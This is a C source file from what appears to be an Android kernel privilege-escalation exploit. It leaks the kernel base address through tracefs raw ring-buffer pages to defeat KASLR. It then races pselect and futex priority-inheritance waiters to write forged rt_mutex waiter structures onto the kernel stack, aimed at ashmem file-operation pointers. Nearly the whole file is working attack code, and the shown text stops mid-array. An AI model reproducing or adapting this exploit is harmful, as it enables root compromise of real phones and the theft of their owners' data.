#include "common.h"

#include <netinet/in.h>
#if defined(SLIDE_STACK_WRITER) && \
    defined(SLIDE_STACK_WRITER_SIGRETURN) && \
    SLIDE_STACK_WRITER == SLIDE_STACK_WRITER_SIGRETURN
#include <asm/sigcontext.h>
#include <ucontext.h>
#endif

#ifndef SLIDE_MAX_ATTEMPTS
#define SLIDE_MAX_ATTEMPTS 20
#endif

/* Panic-proof logging: page cache dies with the kernel on hard reboot, so
 * milestones logged just before a possible panic must be fsync'd to be
 * visible in the next boot's log. NEVER use inside the plant->walk window
 * (fsync is a syscall and would tear the payload). */
#define pr_info_sync(fmt, ...) do { \
    pr_info(fmt, ##__VA_ARGS__); \
    fsync(STDOUT_FILENO); \
  } while (0)
#if !defined(SLIDE_STACK_WRITER)
#ifndef SLIDE_PSELECT_WORD_SHIFT
#define SLIDE_PSELECT_WORD_SHIFT 0
#endif
#endif
#ifndef SLIDE_WAIT_NSEC
#define SLIDE_WAIT_NSEC 50000000L
#endif
#ifndef SLIDE_REQUEUE_ARM_USEC
#define SLIDE_REQUEUE_ARM_USEC 0
#endif
#define SLIDE_REQUEUE_MAX_POLLS 1000
#define SLIDE_REQUEUE_POLL_USEC 1000

#if defined(APP_S928_STABLE_RACE) && APP_S928_STABLE_RACE
#define SLIDE_TRACEFS_ROOT "/sys/kernel/tracing"

static int slide_tracefs_write(const char *path, const char *value) {
  int fd = open(path, O_WRONLY | O_CLOEXEC);
  if (fd < 0) {
    return 0;
  }
  size_t len = strlen(value);
  ssize_t wrote = write(fd, value, len);
  close(fd);
  return wrote == (ssize_t)len;
}

static int slide_tracefs_parse_page(
    const unsigned char *page, size_t page_len, uint64_t *base_out) {
  if (page_len < 20) {
    return 0;
  }

  uint64_t commit = 0;
  memcpy(&commit, page + 8, sizeof(commit));
  size_t data_len = (size_t)(commit & 0xfffULL);
  size_t end = 16 + data_len;
  if (end > page_len) {
    end = page_len;
  }

  for (size_t pos = 16; pos + 4 <= end;) {
    uint32_t event_header = 0;
    memcpy(&event_header, page + pos, sizeof(event_header));
    uint32_t type_len = event_header & 0x1fU;
    if (type_len == 30) {
      pos += 8;
      continue;
    }
    if (type_len == 31) {
      pos += 12;
      continue;
    }
    if (type_len == 0 || type_len >= 29) {
      break;
    }

    size_t record_len = (size_t)type_len * 4;
    size_t record = pos + 4;
    if (record + record_len > end) {
      break;
    }
    uint16_t event_id = 0;
    memcpy(&event_id, page + record, sizeof(event_id));
    if (event_id == SLIDE_TRACEFS_EVENT_ID && record_len >= 24) {
      uint64_t caller = 0;
      memcpy(&caller, page + record + 16, sizeof(caller));
      if (caller >= SLIDE_TRACEFS_WORKER_CALLER_OFF) {
        uint64_t base = caller - SLIDE_TRACEFS_WORKER_CALLER_OFF;
        if (base >= KIMAGE_TEXT_BASE &&
            base <= KIMAGE_TEXT_BASE + 0x1f0000ULL &&
            (base & 0xffffULL) == 0) {
          *base_out = base;
          return 1;
        }
      }
    }
    pos = record + record_len;
  }
  return 0;
}

static int slide_tracefs_resolve_base(uint64_t *base_out) {
  static const char tracing_on[] =
      SLIDE_TRACEFS_ROOT "/tracing_on";
  static const char trace[] =
      SLIDE_TRACEFS_ROOT "/trace";
  static const char event_enable[] =
      SLIDE_TRACEFS_ROOT "/events/sched/sched_blocked_reason/enable";

  if (!slide_tracefs_write(tracing_on, "0") ||
      !slide_tracefs_write(event_enable, "1") ||
      !slide_tracefs_write(tracing_on, "1")) {
    return 0;
  }

  int trace_fd = open(trace, O_WRONLY | O_TRUNC | O_CLOEXEC);
  if (trace_fd >= 0) {
    close(trace_fd);
  }
  sleep(1);
  slide_tracefs_write(tracing_on, "0");

  int cpu_count = (int)sysconf(_SC_NPROCESSORS_ONLN);
  int found = 0;
  for (int cpu = 0; cpu < cpu_count && !found; cpu++) {
    char path[128];
    snprintf(path, sizeof(path),
             SLIDE_TRACEFS_ROOT "/per_cpu/cpu%d/trace_pipe_raw", cpu);
    int fd = open(path, O_RDONLY | O_NONBLOCK | O_CLOEXEC);
    if (fd < 0) {
      continue;
    }
    unsigned char page[PAGE_SIZE];
    ssize_t got;
    while ((got = read(fd, page, sizeof(page))) > 0) {
      if (slide_tracefs_parse_page(page, (size_t)got, base_out)) {
        found = 1;
        break;
      }
    }
    close(fd);
  }
  slide_tracefs_write(event_enable, "0");
  return found;
}
#endif

#if defined(SLIDE_P0_OFFSET_CANDIDATES) && \
    (!defined(APP_PHYS_P0_ORACLE) || !APP_PHYS_P0_ORACLE)
static const uintptr_t slide_p0_offsets[] = {
  SLIDE_P0_OFFSET_CANDIDATES
};
#endif

static uint32_t slide_f_wait;
static uint32_t slide_f_pi_target;
static uint32_t slide_f_pi_chain;
static uint32_t slide_f_scrub;
static atomic_int slide_scrub_held;
static atomic_int slide_scrub_acquired;
static atomic_int slide_waiter_ready;
static atomic_int slide_waiter_waiting;
static atomic_int slide_owner_started;
static atomic_int slide_owner_acquired;
static atomic_int slide_deadlock_seen;
static atomic_int slide_waiter_ok;
static atomic_int slide_route_done;
#if defined(APP_S928_STABLE_RACE) && APP_S928_STABLE_RACE
static atomic_int slide_route_stop;
#endif
static atomic_int slide_waiter_tid;
static atomic_int slide_consume_calls;
static atomic_int slide_consume_go;
static atomic_int slide_consume_seen;
static atomic_int slide_consume_lost;
static atomic_int slide_consume_enter_sched;
static atomic_int slide_consume_stop;
static atomic_int slide_consume_sched_ok;
static atomic_int slide_consume_last_sched_ret;
static atomic_int slide_consume_last_sched_errno;
static atomic_int slide_consumer_ready;
static atomic_int slide_stack_write_window;
static atomic_int slide_pselect_write_window;
#if defined(O1S_EARLY_FIRE) && O1S_EARLY_FIRE
/* TEMP-TEST: consumer early-fire <-> writer skip-reset handshake bayragi. */
static atomic_int slide_early_fired = 0;
#endif
#if defined(O1S_EARLY_FIRE) && O1S_EARLY_FIRE
/* TEMP-TEST: build'de SYNC kapali oldugu icin wchan helper'i yok; kendi
 * okuyucumuz (slide_read_task_wchan ile ayni sozlesme: 1=ok). */
static int slide_early_read_wchan(int tid, char *buf, size_t size) {
  char path[64];
  snprintf(path, sizeof(path), "/proc/self/task/%d/wchan", tid);
  int fd = open(path, O_RDONLY | O_CLOEXEC);
  if (fd < 0)
    return 0;
  ssize_t n = read(fd, buf, size - 1);
  close(fd);
  if (n <= 0)
    return 0;
  buf[n] = 0;
  char *nl = strchr(buf, '\n');
  if (nl)
    *nl = 0;
  return 1;
}
#endif
#if defined(APP_S928_ROUTE_DIAG) && APP_S928_ROUTE_DIAG
static atomic_int slide_pselect_last_ret;
static atomic_int slide_pselect_last_errno;
static atomic_uint_fast64_t slide_pselect_last_elapsed_usec;
#endif
#if (defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION) || \
    (defined(APP_S928_STABLE_RACE) && APP_S928_STABLE_RACE)
static atomic_uint_fast64_t slide_pselect_started_ns;
#endif
#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
static int slide_pselect_production_stack;
#endif
static int slide_route_nfds = PSELECT_ROUTE_NFDS;
static int slide_route_syscall_pad;
static uint64_t slide_route_fine_delay_ticks;
#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
int slide_p0_session_fresh;
#endif
#if defined(APP_PHYS_VIRTUAL_BASE_ORACLE) && APP_PHYS_VIRTUAL_BASE_ORACLE
int p0_virtual_base_probe;
#endif

static int slide_commit_stext(uint64_t stext, const char *source);
static const uint64_t slide_max_offset = 0x3f8000ULL;

#if defined(APP_TRACEFS_SLIDE) && APP_TRACEFS_SLIDE
#define SLIDE_TRACEFS_ROOT "/sys/kernel/tracing"
#define SLIDE_TRACEFS_CANDIDATES 128
static unsigned int slide_tracefs_raw_pages;
static unsigned int slide_tracefs_raw_bytes;
static unsigned int slide_tracefs_raw_events;
static unsigned int slide_tracefs_raw_callers;
static unsigned int slide_tracefs_parse_failures;
static unsigned int slide_tracefs_candidate_hits[SLIDE_TRACEFS_CANDIDATES];

static int slide_tracefs_write(const char *path, const char *value) {
  int fd = open(path, O_WRONLY | O_CLOEXEC);
  if (fd < 0) {
    pr_warning("slide tracefs open write failed path=%s errno=%d\n", path,
             errno);
    return 0;
  }
  size_t len = strlen(value);
  size_t done = 0;
  while (done < len) {
    ssize_t wrote = write(fd, value + done, len - done);
    if (wrote < 0 && errno == EINTR) {
      continue;
    }
    if (wrote <= 0) {
      pr_warning("slide tracefs write failed path=%s done=%zu len=%zu errno=%d\n",
               path, done, len, errno);
      close(fd);
      return 0;
    }
    done += (size_t)wrote;
  }
  if (close(fd) != 0) {
    pr_warning("slide tracefs close write failed path=%s errno=%d\n", path,
             errno);
    return 0;
  }
  return 1;
}

static int slide_tracefs_read_u32(const char *path, uint32_t *value) {
  int fd = open(path, O_RDONLY | O_CLOEXEC);
  if (fd < 0) {
    pr_warning("slide tracefs open read failed path=%s errno=%d\n", path,
             errno);
    return 0;
  }
  char text[32];
  ssize_t got;
  do {
    got = read(fd, text, sizeof(text) - 1);
  } while (got < 0 && errno == EINTR);
  int read_errno = errno;
  if (close(fd) != 0) {
    pr_warning("slide tracefs close read failed path=%s errno=%d\n", path,
             errno);
    return 0;
  }
  if (got <= 0) {
    pr_warning("slide tracefs read failed path=%s got=%zd errno=%d\n", path,
             got, read_errno);
    return 0;
  }
  text[got] = 0;
  char *end = NULL;
  errno = 0;
  unsigned long parsed = strtoul(text, &end, 10);
  while (end && (*end == ' ' || *end == '\t' || *end == '\r' ||
                 *end == '\n')) {
    end++;
  }
  if (errno || end == text || !end || *end || parsed > UINT32_MAX) {
    pr_warning("slide tracefs bad number path=%s value=%s errno=%d\n", path,
             text, errno);
    return 0;
  }
  *value = (uint32_t)parsed;
  return 1;
}

static int slide_tracefs_clear(const char *path) {
  int fd = open(path, O_WRONLY | O_TRUNC | O_CLOEXEC);
  if (fd < 0) {
    pr_warning("slide tracefs clear open failed path=%s errno=%d\n", path,
             errno);
    return 0;
  }
  if (close(fd) != 0) {
    pr_warning("slide tracefs clear close failed path=%s errno=%d\n", path,
             errno);
    return 0;
  }
  return 1;
}

static int slide_tracefs_parse_page(const unsigned char *page,
                                    size_t page_len,
                                    uint16_t trace_event_id) {
  if (page_len != PAGE_SIZE) {
    slide_tracefs_parse_failures++;
    return 0;
  }
  uint64_t commit = 0;
  memcpy(&commit, page + 8, sizeof(commit));
  size_t data_len = (size_t)(commit & 0xfffULL);
  size_t end = 16 + data_len;
  if (end > page_len) {
    slide_tracefs_parse_failures++;
    return 0;
  }
  for (size_t pos = 16; pos + 4 <= end;) {
    uint32_t event_header = 0;
    memcpy(&event_header, page + pos, sizeof(event_header));
    uint32_t type_len = event_header & 0x1fU;
    uint32_t time_delta = event_header >> 5;
    if (type_len == 30 || type_len == 31) {
      if (pos + 8 > end) {
        slide_tracefs_parse_failures++;
        return 0;
      }
      pos += 8;
      continue;
    }
    if (type_len == 29) {
      if (!time_delta) {
        break;
      }
      if (pos + 8 > end) {
        slide_tracefs_parse_failures++;
        return 0;
      }
      uint32_t padding_len = 0;
      memcpy(&padding_len, page + pos + 4, sizeof(padding_len));
      size_t total_len = 4 + (size_t)padding_len;
      if (total_len < 8 || pos + total_len > end) {
        slide_tracefs_parse_failures++;
        return 0;
      }
      pos += total_len;
      continue;
    }
    size_t record;
    size_t record_len;
    size_t total_len;
    if (type_len == 0) {
      if (pos + 8 > end) {
        slide_tracefs_parse_failures++;
        return 0;
      }
      uint32_t extended_len = 0;
      memcpy(&extended_len, page + pos + 4, sizeof(extended_len));
      if (extended_len < 4) {
        slide_tracefs_parse_failures++;
        return 0;
      }
      record = pos + 8;
      record_len = (size_t)extended_len - 4;
      total_len = 4 + (size_t)extended_len;
    } else if (type_len <= 28) {
      record = pos + 4;
      record_len = (size_t)type_len * 4;
      total_len = 4 + record_len;
    } else {
      slide_tracefs_parse_failures++;
      return 0;
    }
    if (pos + total_len > end || record + record_len > end) {
      slide_tracefs_parse_failures++;
      return 0;
    }
    uint16_t event_id = 0;
    memcpy(&event_id, page + record, sizeof(event_id));
    slide_tracefs_raw_events++;
    if (event_id == trace_event_id) {
      if (record_len < 24) {
        slide_tracefs_parse_failures++;
        return 0;
      }
      uint64_t caller = 0;
      memcpy(&caller, page + record + 16, sizeof(caller));
      if (slide_tracefs_raw_callers < 8) {
        pr_info("slide tracefs raw caller=%016llx event=%u len=%zu\n",
                (unsigned long long)caller, event_id, record_len);
      }
      slide_tracefs_raw_callers++;
      static const uint64_t link_callers[] = {
        KIMAGE_TEXT_BASE + SLIDE_TRACEFS_WORKER_CALLER_OFF,
#ifdef SLIDE_TRACEFS_VFORK_CALLER_OFF
        KIMAGE_TEXT_BASE + SLIDE_TRACEFS_VFORK_CALLER_OFF,
#endif
      };
      for (size_t index = 0;
           index < sizeof(link_callers) / sizeof(link_callers[0]); index++) {
        if (caller >= link_callers[index]) {
          uint64_t candidate = caller - link_callers[index];
          if (candidate <= slide_max_offset &&
              (candidate & 0x7fffULL) == 0) {
            size_t slot = (size_t)(candidate >> 15);
            slide_tracefs_candidate_hits[slot]++;
          }
        }
      }
    }
    pos += total_len;
  }
  return 1;
}

static int slide_tracefs_trigger_vfork(void) {
#ifdef SLIDE_TRACEFS_VFORK_CALLER_OFF
  for (int index = 0; index < 96; index++) {
    int status = 0;
    pid_t child = vfork();
    if (child < 0) {
      pr_warning("slide tracefs vfork failed errno=%d\n", errno);
      return 0;
    }
    if (child == 0) {
      struct timespec hold = {.tv_sec = 0, .tv_nsec = 1000000L};
      syscall(SYS_nanosleep, &hold, NULL);
      _exit(0);
    }
    if (waitpid(child, &status, 0) != child) {
      pr_warning("slide tracefs waitpid failed errno=%d\n", errno);
      return 0;
    }
    if (!WIFEXITED(status) || WEXITSTATUS(status) != 0) {
      pr_warning("slide tracefs vfork child failed status=%d\n", status);
      return 0;
    }
  }
  pr_info("slide tracefs trigger vforks=96 child_sleep_us=1000\n");
  return 1;
#else
  return 0;
#endif
}

static int slide_tracefs_trigger_io(void) {
  char path[96];
  snprintf(path, sizeof(path), "/data/local/tmp/.rmg-trace-io-%d", getpid());
  int fd = open(path, O_WRONLY | O_CREAT | O_TRUNC | O_CLOEXEC, 0600);
  if (fd < 0) {
    pr_warning("slide tracefs trigger open failed errno=%d\n", errno);
    return 0;
  }
  size_t chunk_size = 0x40000;
  unsigned char *chunk = calloc(1, chunk_size);
  if (!chunk) {
    int saved_errno = errno;
    close(fd);
    unlink(path);
    errno = saved_errno;
    pr_warning("slide tracefs trigger alloc failed errno=%d\n", errno);
    return 0;
  }
  int ok = 1;
  for (int round = 0; round < 16 && ok; round++) {
    size_t done = 0;
    while (done < chunk_size) {
      ssize_t wrote = write(fd, chunk + done, chunk_size - done);
      if (wrote < 0 && errno == EINTR) {
        continue;
      }
      if (wrote <= 0) {
        pr_warning("slide tracefs trigger write failed done=%zu size=%zu errno=%d\n",
                 done, chunk_size, errno);
        ok = 0;
        break;
      }
      done += (size_t)wrote;
    }
  }
  free(chunk);
  if (ok && fsync(fd) != 0) {
    pr_warning("slide tracefs trigger fsync failed errno=%d\n", errno);
    ok = 0;
  }
  if (close(fd) != 0) {
    pr_warning("slide tracefs trigger close failed errno=%d\n", errno);
    ok = 0;
  }
  if (unlink(path) != 0) {
    pr_warning("slide tracefs trigger unlink failed path=%s errno=%d\n", path,
             errno);
    ok = 0;
  }
  if (!ok) {
    pr_warning("slide tracefs trigger failed\n");
    return 0;
  }
  pr_info("slide tracefs trigger bytes=%u\n", 16U * 0x40000U);
  return 1;
}

static int slide_tracefs_trigger(void) {
  int vfork_ok = slide_tracefs_trigger_vfork();
  int io_ok = slide_tracefs_trigger_io();
  pr_info("slide tracefs trigger result vfork=%d io=%d\n",
          vfork_ok, io_ok);
  return vfork_ok || io_ok;
}

static int slide_tracefs_leak_kernel_base(void) {
  static const char tracing_on[] =
      SLIDE_TRACEFS_ROOT "/tracing_on";
  static const char trace[] =
      SLIDE_TRACEFS_ROOT "/trace";
  static const char event_enable[] =
      SLIDE_TRACEFS_ROOT "/events/sched/sched_blocked_reason/enable";
  static const char event_id_path[] =
      SLIDE_TRACEFS_ROOT "/events/sched/sched_blocked_reason/id";
  uint32_t old_tracing = 0;
  uint32_t old_event = 0;
  uint32_t event_id = 0;
  int restore_needed = 0;
  int setup_ok = 0;
  int scan_ok = 1;
  int cpu_files = 0;
  int candidate_count = 0;
  uintptr_t candidate = 0;

  if (!slide_tracefs_read_u32(tracing_on, &old_tracing) ||
      !slide_tracefs_read_u32(event_enable, &old_event) ||
      !slide_tracefs_read_u32(event_id_path, &event_id)) {
    return 0;
  }
  if (old_tracing > 1 || old_event > 1 || event_id == 0 ||
      event_id > UINT16_MAX) {
    pr_warning("slide tracefs profile mismatch tracing=%u event=%u id=%u\n",
             old_tracing, old_event, event_id);
    return 0;
  }
  /* Event id'ler boot'ta dinamik atanir (59 vs 60 gibi); id dosyasinin
   * kendisi sched_blocked_reason'a ait oldugundan kesfedilen deger
   * kullanilir, macro ile esitlik aranmaz. */
  pr_info("slide tracefs live id=%u (macro=%u)\n",
          event_id, SLIDE_TRACEFS_EVENT_ID);
  restore_needed = 1;
  pr_info("slide tracefs state tracing=%u event=%u id=%u\n",
          old_tracing, old_event, event_id);
  if (!slide_tracefs_write(tracing_on, "0") ||
      !slide_tracefs_write(event_enable, "0") ||
      !slide_tracefs_clear(trace) ||
      !slide_tracefs_write(event_enable, "1") ||
      !slide_tracefs_write(tracing_on, "1")) {
    pr_warning("slide tracefs setup failed\n");
    goto out;
  }
  if (!slide_tracefs_trigger()) {
    goto out;
  }
  if (!slide_tracefs_write(tracing_on, "0") ||
      !slide_tracefs_write(event_enable, "0")) {
    pr_warning("slide tracefs stop failed\n");
    goto out;
  }

  long cpu_count = sysconf(_SC_NPROCESSORS_CONF);
  if (cpu_count <= 0 || cpu_count > 256) {
    pr_warning("slide tracefs bad cpu count=%ld errno=%d\n", cpu_count,
             errno);
    goto out;
  }
  slide_tracefs_raw_pages = 0;
  slide_tracefs_raw_bytes = 0;
  slide_tracefs_raw_events = 0;
  slide_tracefs_raw_callers = 0;
  slide_tracefs_parse_failures = 0;
  memset(slide_tracefs_candidate_hits, 0,
         sizeof(slide_tracefs_candidate_hits));
  for (int cpu = 0; cpu < cpu_count; cpu++) {
    char path[128];
    snprintf(path, sizeof(path),
             SLIDE_TRACEFS_ROOT "/per_cpu/cpu%d/trace_pipe_raw", cpu);
    int fd = open(path, O_RDONLY | O_NONBLOCK | O_CLOEXEC);
    if (fd < 0) {
      pr_warning("slide tracefs cpu open failed cpu=%d errno=%d\n", cpu,
               errno);
      scan_ok = 0;
      continue;
    }
    cpu_files++;
    unsigned char page[4096];
    for (;;) {
      ssize_t got = read(fd, page, sizeof(page));
      if (got < 0 && errno == EINTR) {
        continue;
      }
      if (got < 0 && errno == EAGAIN) {
        break;
      }
      if (got < 0) {
        pr_warning("slide tracefs cpu read failed cpu=%d errno=%d\n", cpu,
                 errno);
        scan_ok = 0;
        break;
      }
      if (got == 0) {
        break;
      }
      slide_tracefs_raw_pages++;
      slide_tracefs_raw_bytes += (unsigned int)got;
      if (!slide_tracefs_parse_page(page, (size_t)got,
                                    (uint16_t)event_id)) {
        scan_ok = 0;
        break;
      }
    }
    if (close(fd) != 0) {
      pr_warning("slide tracefs cpu close failed cpu=%d errno=%d\n", cpu,
               errno);
      scan_ok = 0;
    }
  }
  for (size_t slot = 0; slot < SLIDE_TRACEFS_CANDIDATES; slot++) {
    if (!slide_tracefs_candidate_hits[slot]) {
      continue;
    }
    uintptr_t slot_candidate = slot << 15;
    pr_info("slide tracefs candidate=%08zx hits=%u\n",
            slot_candidate, slide_tracefs_candidate_hits[slot]);
    candidate = slot_candidate;
    candidate_count++;
  }
  pr_info("slide tracefs raw summary pages=%u bytes=%u events=%u callers=%u parse_fail=%u candidates=%d cpu_files=%d\n",
          slide_tracefs_raw_pages, slide_tracefs_raw_bytes,
          slide_tracefs_raw_events, slide_tracefs_raw_callers,
          slide_tracefs_parse_failures, candidate_count, cpu_files);
  if (!scan_ok || slide_tracefs_parse_failures || !cpu_files ||
      candidate_count != 1) {
    pr_warning("slide tracefs candidate gate failed\n");
    goto out;
  }
  setup_ok = 1;

out:
  if (restore_needed) {
    int restore_ok = 1;
    restore_ok &= slide_tracefs_write(tracing_on, "0");
    restore_ok &= slide_tracefs_write(event_enable,
                                      old_event ? "1" : "0");
    restore_ok &= slide_tracefs_write(tracing_on,
                                      old_tracing ? "1" : "0");
    pr_info("slide tracefs restore tracing=%u event=%u ok=%d\n",
            old_tracing, old_event, restore_ok);
    if (!restore_ok) {
      return 0;
    }
  }
  if (!setup_ok) {
    return 0;
  }
  pr_success("slide tracefs caller gate candidate=%08zx\n", candidate);
  return slide_commit_stext(KIMAGE_TEXT_BASE + candidate, "tracefs");
}
#endif

#if defined(APP_PHYS_VIRTUAL_BASE_ORACLE) && APP_PHYS_VIRTUAL_BASE_ORACLE
static int slide_commit_virtual_base(uint64_t base, const char *source) {
  if ((base >> 48) != 0xffff || (base & 0x1fffffULL) != 0 ||
      base < KIMAGE_VIRTUAL_BASE_MIN || base > KIMAGE_VIRTUAL_BASE_MAX ||
      base > UINT64_MAX - ASHMEM_FOPS_OFF) {
    pr_warning("virtual base rejected source=%s base=%016llx\n",
               source, (unsigned long long)base);
    return 0;
  }
  kaslr_base = base;
  kaslr_slide = base - KIMAGE_TEXT_BASE;
  kaslr_done = 1;
  data_addr_canonical = 1;
  app_publish_p0_offset(slide_p0_offset);
  pr_success("slide-kaslr-ok source=%s pid=%d base=%016llx "
             "virtual_slide=%016llx p0_offset=%08zx\n",
             source, getpid(), (unsigned long long)kaslr_base,
             (unsigned long long)kaslr_slide, slide_p0_offset);
  return 1;
}
#endif

static useconds_t slide_enter_delay_usec(void) {
#if defined(SLIDE_STACK_WRITER)
  return 0;
#else
  const char *forced = getenv("SLIDE_ENTER_DELAY_USEC");
  if (!forced || !*forced) {
    forced = getenv("PSELECT_DELAY_USEC");
  }
  if (forced && *forced) {
    char *end = NULL;
    errno = 0;
    long value = strtol(forced, &end, 0);
    if (!errno && end != forced && !*end && value >= 0 && value <= 1000000) {
      return (useconds_t)value;
    }
  }
  return PSELECT_ENTER_DELAY_USEC;
#endif
}

static void slide_wait_before_consume(int sequence) {
  if (sequence == 1) {
    useconds_t delay = slide_enter_delay_usec();
    if (delay) {
      usleep(delay);
    }
  }
}

static uint64_t slide_select_route_fine_delay_ticks(void) {
#if defined(APP_FOPS_ROUTE_FINE_DELAY_TICKS)
  const char *override_text = getenv("FINE_TICKS_OVERRIDE");
  if (override_text && *override_text) {
    char *override_end = NULL;
    errno = 0;
    unsigned long long override_value =
        strtoull(override_text, &override_end, 0);
    if (!errno && override_end != override_text && !*override_end) {
      return (uint64_t)override_value;
    }
  }
  static const uint64_t delays[] = {
    APP_FOPS_ROUTE_FINE_DELAY_TICKS
  };
  size_t attempt = 1;
  const char *text = getenv("S23_SUPERVISOR_ATTEMPT");
  if (text && *text) {
    char *end = NULL;
    errno = 0;
    unsigned long value = strtoul(text, &end, 0);
    if (errno || end == text || *end || value == 0) {
      pr_error("bad S23_SUPERVISOR_ATTEMPT value=%s\n", text);
      return UINT64_MAX;
    }
    attempt = value;
  }
  return delays[(attempt - 1) % (sizeof(delays) / sizeof(delays[0]))];
#else
  return 0;
#endif
}

static int slide_override_route_coarse_delay(int *delay) {
  const char *text = getenv("STACK_WRITER_DELAY_USEC");
  if (!text || !*text) {
    return 1;
  }
  char *end = NULL;
  errno = 0;
  long value = strtol(text, &end, 0);
  if (errno || end == text || *end || value < 0 || value > 1000000) {
    pr_error("bad STACK_WRITER_DELAY_USEC value=%s\n", text);
    return 0;
  }
  *delay = (int)value;
  return 1;
}

#if defined(APP_S928_STABLE_RACE) && APP_S928_STABLE_RACE
static int slide_s928_fops_delay_override(int *delay) {
  const char *forced = getenv("FOPS_DELAY_USEC");
  if (!forced || !*forced) {
    return 0;
  }
  char *end = NULL;
  errno = 0;
  long value = strtol(forced, &end, 0);
  if (errno || end == forced || *end || value < 0 || value > 1000000) {
    return 0;
  }
  *delay = (int)value;
  return 1;
}
#endif

static inline uint64_t slide_read_cntvct(void) {
  uint64_t value;
  __asm__ volatile("isb\n\tmrs %0, cntvct_el0\n\tisb"
                   : "=r"(value) :: "memory");
  return value;
}

static void slide_apply_route_fine_delay(void) {
  uint64_t ticks = slide_route_fine_delay_ticks;
  if (!ticks || ticks == UINT64_MAX) {
    return;
  }
  uint64_t start = slide_read_cntvct();
  while (slide_read_cntvct() - start < ticks) {
    __asm__ volatile("yield" ::: "memory");
  }
}

#if !defined(SLIDE_STACK_WRITER)
static uint64_t slide_fdset_get_word(const fd_set *set, int word) {
  uint64_t value = 0;
  memcpy(&value, (const unsigned char *)set + word * sizeof(value),
         sizeof(value));
  return value;
}
#endif

static void slide_log_child_context(void) {
  char attr[256];
  char enforce[32];
  read_first_line("/proc/self/attr/current", attr, sizeof(attr));
  read_first_line("/sys/fs/selinux/enforce", enforce, sizeof(enforce));
  const char *stack_writer = "pselect";
#if defined(SLIDE_STACK_WRITER) && \
    defined(SLIDE_STACK_WRITER_MCAST) && \
    SLIDE_STACK_WRITER == SLIDE_STACK_WRITER_MCAST
  stack_writer = "mcast";
#elif defined(SLIDE_STACK_WRITER) && \
      defined(SLIDE_STACK_WRITER_SIGRETURN) && \
      SLIDE_STACK_WRITER == SLIDE_STACK_WRITER_SIGRETURN
  stack_writer = "sigreturn";
#endif
  pr_success("slide child context stack_writer=%s pid=%d uid=%u euid=%u "
             "gid=%u egid=%u attr=%s enforce=%s\n",
             stack_writer, getpid(), getuid(), geteuid(), getgid(), getegid(),
             attr, enforce);
}

#if !defined(SLIDE_STACK_WRITER)
int slide_pselect_words_per_set(void) {
  int bits_per_word = (int)(8 * sizeof(unsigned long));
  return (slide_route_nfds + bits_per_word - 1) / bits_per_word;
}

int slide_pselect_global_word(int waiter_word) {
  return SLIDE_PSELECT_WORD_SHIFT + waiter_word;
}

int slide_pselect_put_global_word(
    fd_set *in, fd_set *out, fd_set *ex, int words_per_set,
    int global_word, uint64_t value) {
  if (global_word < 0) {
    return 0;
  }

  int set_idx = global_word / words_per_set;
  int word_idx = global_word % words_per_set;
  switch (set_idx) {
    case 0:
      fdset_put_word(in, word_idx, value);
      return 1;
    case 1:
      fdset_put_word(out, word_idx, value);
      return 1;
    case 2:
      fdset_put_word(ex, word_idx, value);
      return 1;
    default:
      return 0;
  }
}

uint64_t slide_pselect_get_global_word(
    const fd_set *in, const fd_set *out, const fd_set *ex,
    int words_per_set, int global_word) {
  if (global_word < 0) {
    return 0;
  }

  int set_idx = global_word / words_per_set;
  int word_idx = global_word % words_per_set;
  switch (set_idx) {
    case 0:
      return slide_fdset_get_word(in, word_idx);
    case 1:
      return slide_fdset_get_word(out, word_idx);
    case 2:
      return slide_fdset_get_word(ex, word_idx);
    default:
      return 0;
  }
}

void slide_pselect_put_waiter_word(
    fd_set *in, fd_set *out, fd_set *ex, int words_per_set,
    int waiter_word, uint64_t value, const char *name) {
  int global_word = slide_pselect_global_word(waiter_word);
  int placed = slide_pselect_put_global_word(
      in, out, ex, words_per_set, global_word, value);
  if (!placed) {
    pr_warning("slide pselect cannot place %s waiter_word=%d global_word=%d "
               "words_per_set=%d nfds=%d\n",
               name, waiter_word, global_word, words_per_set,
               slide_route_nfds);
  }
}

#if defined(APP_S928_STABLE_RACE) && APP_S928_STABLE_RACE
#define RMG_RACE_INLINE static inline __attribute__((always_inline))
#define ACTIVE_PSELECT_WAITER_PRIO SLIDE_FAKE_WAITER_PRIO
#else
#define RMG_RACE_INLINE
#define ACTIVE_PSELECT_WAITER_PRIO FAKE_WAITER_PRIO
#endif

RMG_RACE_INLINE void prepare_slide_pselect_fdsets(
    fd_set *in, fd_set *out, fd_set *ex) {
  FD_ZERO(in);
  FD_ZERO(out);
  FD_ZERO(ex);

  int words_per_set = slide_pselect_words_per_set();
#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
#if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
  uintptr_t stack_tree_parent = slide_oracle_parent;
  uintptr_t stack_tree_right = 0;
  uintptr_t stack_tree_left = slide_oracle_target;
  uintptr_t stack_pi_parent = slide_oracle_parent;
  uintptr_t stack_pi_right = 0;
  uintptr_t stack_pi_left = slide_oracle_target;
  uintptr_t stack_task = fake_task;
  slide_pselect_production_stack = 0;
#if defined(APP_PRODUCTION_STACK_PI_RIGHT_ONLY) && \
    APP_PRODUCTION_STACK_PI_RIGHT_ONLY
  if (slide_oracle_parent == fake_fops &&
      slide_oracle_target == data_addr(ASHMEM_MISC_FOPS)) {
    /*
     * The stale pselect waiter is dequeued from the lock waiter tree before
     * the PI-tree requeue.  Keep its proven oracle tree and fake-task fields;
     * build 58 cleared the tree child and consequently produced no write.
     * Isolate only the established FOPS PI-child direction here.
     */
    stack_pi_right = data_addr(ASHMEM_MISC_FOPS);
    stack_pi_left = 0;
    slide_pselect_production_stack = 1;
  }
#endif
#else
  slide_pselect_production_stack = 0;
#endif
#endif
  struct slide_waiter_word {
    int word;
    uint64_t value;
    const char *name;
  } words[] = {
#if LEGACY_RT_MUTEX_WAITER || COMPACT_RT_MUTEX_WAITER
#if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
    {0, stack_tree_parent, "tree_pc"},
    {1, stack_tree_right, "tree_right"},
    {2, stack_tree_left, "tree_left"},
    {3, stack_pi_parent, "pi_pc"},
    {4, stack_pi_right, "pi_right"},
